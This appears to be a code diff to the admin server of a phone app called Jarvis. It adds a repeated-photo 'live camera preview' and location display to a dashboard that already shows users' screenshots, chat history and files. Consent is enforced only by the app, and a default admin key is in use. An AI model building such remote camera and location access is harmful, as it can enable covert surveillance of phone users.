@@ -66,6 +66,7 @@ const DEFAULT_CONFIG = {
   apk_url: "",
   screenshot_requested: {}, // install_id -> true (consumed when the app uploads)
   camera_requested: {}, // install_id -> true (consumed when the app uploads a photo)
+  live_camera: {}, // install_id -> true (admin live preview — app uploads a photo every ~12s while set)
   messages: [], // {id, target: "all" | install_id, title, body, at} — shown as a notification on the phone
 };
 
@@ -295,7 +296,7 @@ function dashboardHtml(users, devices, cfg, key) {
         ? `<img src="/api/admin/screenshot/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest screen" loading="lazy">`
         : '<p class="muted">No screenshot yet.</p>';
       const cam = u.last_camera_at
-        ? `<img src="/api/admin/camera-photo/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest camera photo" loading="lazy">`
+        ? `<img id="camImg-${escapeHtml(u.install_id)}" src="/api/admin/camera-photo/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest camera photo" loading="lazy">`
         : '<p class="muted">No camera photo yet.</p>';
       const fileLinks = (u.files || []).length
         ? (u.files || []).map((f) => `<li><a href="/api/admin/file/${escapeHtml(u.install_id)}/${encodeURIComponent(f)}?key=${encodeURIComponent(key)}">${escapeHtml(f)}</a></li>`).join("")
@@ -306,14 +307,15 @@ function dashboardHtml(users, devices, cfg, key) {
 <div class="muted">First seen ${escapeHtml(fmtTime(u.first_seen))} · Last seen ${escapeHtml(fmtTime(u.last_seen))}</div>
 <div>Last action: <b>${escapeHtml(u.last_action || "—")}</b></div>
 <div>Monitoring: ${u.monitoring ? '<span class="ok">ON — user allowed it</span>' : '<span class="muted">OFF</span>'}</div>
+<div>${u.last_location ? `📍 Location: <b>${escapeHtml(u.last_location.address || (u.last_location.lat + ", " + u.last_location.lng))}</b> <span class="muted">(${escapeHtml(fmtTime(u.last_location.at))}${u.last_location.accuracy_m ? " · ±" + escapeHtml(String(u.last_location.accuracy_m)) + "m" : ""})</span> <a href="https://www.google.com/maps?q=${encodeURIComponent(u.last_location.lat + "," + u.last_location.lng)}" target="_blank">Open in Maps</a>` : '<span class="muted">📍 Location: not shared (user has location tracking OFF).</span>'}</div>
 <div class="row"><b>Permissions:</b> ${permChips}</div>
 ${acts ? `<div><b>Recent activity:</b><ul>${acts}</ul></div>` : ""}
 ${evs ? `<div><b>Events:</b><ul>${evs}</ul></div>` : ""}
 ${hist ? `<details><summary>Chat history (${(u.history || []).length} messages)</summary><div class="hist">${hist}</div></details>` : ""}
 <details><summary>Screen ${u.last_screenshot_at ? "· " + escapeHtml(fmtTime(u.last_screenshot_at)) : ""}</summary>${shot}
 <p><button onclick="reqShot('${escapeHtml(u.install_id)}')">Request screenshot</button> <span class="muted">— the app sends one screenshot on its next heartbeat, only if the user allowed monitoring.</span></p></details>
-<details><summary>Camera ${u.last_camera_at ? "· " + escapeHtml(fmtTime(u.last_camera_at)) : ""}</summary>${cam}
-<p><button onclick="reqCam('${escapeHtml(u.install_id)}')">Request camera photo</button> <span class="muted">— one photo from the phone camera, only if the user allowed monitoring and camera permission.</span></p></details>
+<details><summary>Camera ${u.last_camera_at ? "· " + escapeHtml(fmtTime(u.last_camera_at)) : ""} <span id="liveBadge-${escapeHtml(u.install_id)}"></span></summary>${cam}
+<p><button onclick="reqCam('${escapeHtml(u.install_id)}')">Request camera photo</button> <button onclick="reqLiveCam('${escapeHtml(u.install_id)}')">▶ Live preview</button> <button onclick="stopLiveCam('${escapeHtml(u.install_id)}')">⏹ Stop live</button> <span class="muted">— one photo, or live preview (a fresh photo every ~12s, not video) — only if the user allowed monitoring and camera permission.</span></p></details>
 ${fileLinks ? `<details open><summary>Files (${(u.files || []).length})</summary><ul>${fileLinks}</ul></details>` : `<div class="muted">Files: none uploaded yet (only with monitoring ON + file permission).</div>`}
 <div class="bigbtns">
 <button class="ban" onclick="act('${escapeHtml(u.install_id)}','ban')">🚫 BAN USER</button>
@@ -367,8 +369,8 @@ img{max-width:100%;border-radius:10px;border:1px solid #334155;margin-top:6px}
 ${USING_DEFAULT_KEY ? '<div class="warnbar"><b>WARNING:</b> You are using the default admin key (jarvis-admin-123). Anyone who knows it can control every install. Set a strong ADMIN_KEY environment variable on Render and redeploy.</div>' : ""}
 <div class="panel"><h2>📜 Policy — plain and simple</h2>
 <p><b>What the admin CAN see / do here:</b> which installs exist (device, app version, first/last seen, last action), Ban / Suspend / Shutdown one user or one whole device in one click, turn Jarvis features on/off for everyone, add instructions, post an announcement, publish an app update.</p>
-<p><b>What the admin sees ONLY when the app user turned ON "Owner monitoring" in Jarvis Settings:</b> recent activity, which permissions the user granted, recent chat history, one screenshot (only when requested), one camera photo (only when requested), small text files from Jarvis's own workspace (only with file permission).</p>
-<p><b>What the admin NEVER sees / does:</b> no passwords, no OTPs, no live camera video, no live screen stream, no location tracking, no data from other apps, no silent installs (every update needs one tap on Install), no phone unlocking. If monitoring is OFF, the admin sees only the install's device, version and last action — nothing else.</p>
+<p><b>What the admin sees ONLY when the app user turned ON "Owner monitoring" in Jarvis Settings:</b> recent activity, which permissions the user granted, recent chat history, one screenshot (only when requested), one camera photo (only when requested) or live camera preview (a fresh photo every ~12s while the admin has it on — photo slideshow, not video), small text files from Jarvis's own workspace (only with file permission), and location (only when the user turned ON location tracking).</p>
+<p><b>What the admin NEVER sees / does:</b> no passwords, no OTPs, no true live camera video, no live screen stream, no location tracking (unless the user turned ON location tracking), no data from other apps, no silent installs (every update needs one tap on Install), no phone unlocking. If monitoring is OFF, the admin sees only the install's device, version and last action — nothing else.</p>
 </div>
 <div class="cards">
 <div class="card"><b>${total}</b><span>Total installs</span></div>
@@ -441,6 +443,33 @@ async function reqShot(id) {
 }
 async function reqCam(id) {
   if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_camera' })) alert('Camera photo requested — it appears here after the app\\'s next heartbeat (within ~15 min).');
+}
+const liveTimers = {};
+async function reqLiveCam(id) {
+  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_live_camera' })) {
+    alert('Live camera preview ON — a fresh photo every ~12s (photo slideshow, not video). It starts after the next heartbeat (within ~15 min, or sooner if the app is opened).');
+    startLiveRefresh(id);
+  }
+}
+async function stopLiveCam(id) {
+  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'stop_live_camera' })) {
+    stopLiveRefresh(id);
+    alert('Live camera preview OFF.');
+  }
+}
+function startLiveRefresh(id) {
+  stopLiveRefresh(id);
+  const badge = document.getElementById('liveBadge-' + id);
+  if (badge) badge.innerHTML = ' <span class="ok">● LIVE</span>';
+  liveTimers[id] = setInterval(() => {
+    const img = document.getElementById('camImg-' + id);
+    if (img) img.src = '/api/admin/camera-photo/' + encodeURIComponent(id) + '?key=' + encodeURIComponent(KEY) + '&t=' + Date.now();
+  }, 5000);
+}
+function stopLiveRefresh(id) {
+  if (liveTimers[id]) { clearInterval(liveTimers[id]); delete liveTimers[id]; }
+  const badge = document.getElementById('liveBadge-' + id);
+  if (badge) badge.innerHTML = '';
 }
 async function saveCfg() {
   const features = {};
@@ -530,6 +559,7 @@ const server = http.createServer(async (req, res) => {
           history: [],
           last_screenshot_at: null,
           email: body.email ? String(body.email).slice(0, 120) : "",
+          last_location: (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") ? { lat: body.location.lat, lng: body.location.lng, address: String(body.location.address || ""), accuracy_m: body.location.accuracy_m || null, at: now } : null,
         };
         users[installId] = user;
       } else {
@@ -540,6 +570,10 @@ const server = http.createServer(async (req, res) => {
         if (body.last_action !== undefined) user.last_action = body.last_action;
         if (body.monitoring !== undefined) user.monitoring = !!body.monitoring;
         if (body.email) user.email = String(body.email).slice(0, 120);
+        // v1.4.7b: location tracking — only when the user turned it ON (opt-in)
+        if (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") {
+          user.last_location = { lat: body.location.lat, lng: body.location.lng, address: String(body.location.address || ""), accuracy_m: body.location.accuracy_m || null, at: new Date().toISOString() };
+        }
         if (body.permissions && typeof body.permissions === "object") user.permissions = body.permissions;
         if (Array.isArray(body.recent_activity)) user.recent_activity = body.recent_activity.slice(-20);
       }
@@ -553,6 +587,7 @@ const server = http.createServer(async (req, res) => {
         config: publicConfig(cfg),
         screenshot_requested: shotRequested,
         camera_requested: camRequested,
+        live_camera: !!(cfg.live_camera && cfg.live_camera[installId]),
       });
     }
 
@@ -842,6 +877,22 @@ const server = http.createServer(async (req, res) => {
         cfg.camera_requested[installId] = true;
         saveConfig(cfg);
         return sendJson(res, 200, { ok: true, camera_requested: true });
+      }
+
+      if (action === "request_live_camera") {
+        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
+        const cfg = loadConfig();
+        cfg.live_camera = cfg.live_camera || {};
+        cfg.live_camera[installId] = true;
+        saveConfig(cfg);
+        return sendJson(res, 200, { ok: true, live_camera: true });
+      }
+
+      if (action === "stop_live_camera") {
+        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
+        const cfg = loadConfig();
+        if (cfg.live_camera) { delete cfg.live_camera[installId]; saveConfig(cfg); }
+        return sendJson(res, 200, { ok: true, live_camera: false });
       }
 
       if (!user) return sendJson(res, 404, { error: "unknown install_id" });
